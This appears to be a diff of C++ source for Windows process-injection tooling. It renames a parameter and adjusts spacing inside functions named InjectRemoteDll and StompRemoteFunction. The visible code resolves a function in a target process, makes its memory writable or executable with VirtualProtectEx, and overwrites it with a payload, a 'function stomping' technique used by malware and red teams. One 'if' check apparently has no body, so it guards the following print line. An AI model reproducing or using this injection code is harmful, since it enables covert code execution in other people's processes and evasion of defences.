@@ -294,7 +294,7 @@ BOOL InjectRemoteDll //Input safeguards needed.
 (
 	IN     PVOID   pPayload,
 	IN	   HANDLE  hProcess, 
-	IN	   LPWSTR   TargetDllName,
+	IN	   LPWSTR  lpTargetDllName,
 	IN     LPSTR   TargetFunctionName,
 	IN     SIZE_T  sSizeToWrite,
 	   OUT PVOID  *pRemoteFunctionAddress
@@ -304,7 +304,7 @@ BOOL InjectRemoteDll //Input safeguards needed.
 	LPVOID pTargetFunctionAddress = nullptr;
 	DWORD  dwOldProtections		  = NULL;
 
-	*pRemoteFunctionAddress = reinterpret_cast<PVOID>(GetProcessAddressReplacement(LoadLibraryW(TargetDllName), TargetFunctionName));
+	*pRemoteFunctionAddress = reinterpret_cast<PVOID>(GetProcessAddressReplacement(LoadLibraryW(lpTargetDllName), TargetFunctionName));
 
 	if (*pRemoteFunctionAddress == nullptr) return FALSE;
 
@@ -319,7 +319,7 @@ BOOL InjectRemoteDll //Input safeguards needed.
 
 	if (VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_EXECUTE_READWRITE, &dwOldProtections) == FALSE)
 
-	wprintf(L"[i] Injected %s to the targeted process! Payload allocated At : 0x%p Of Size : %zu\n", TargetDllName, *pRemoteFunctionAddress, sSizeToWrite);
+	wprintf(L"[i] Injected %s to the targeted process! Payload allocated At : 0x%p Of Size : %zu\n", lpTargetDllName, *pRemoteFunctionAddress, sSizeToWrite);
 
 	return TRUE;
 }
@@ -385,8 +385,8 @@ BOOL StompRemoteFunction
 {
 	if (hTargetProcess == INVALID_HANDLE_VALUE ||  hTargetProcess == nullptr || pTargetFuncAddress == nullptr || pPayload == nullptr || sPayloadSize == NULL) return FALSE;
 
-	DWORD dwOldProtections = NULL;
-	SIZE_T sBytesWritten   = NULL;
+	DWORD  dwOldProtections = NULL;
+	SIZE_T sBytesWritten    = NULL;
 
 	if (VirtualProtectEx(hTargetProcess, pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections) == FALSE) return FALSE;
 
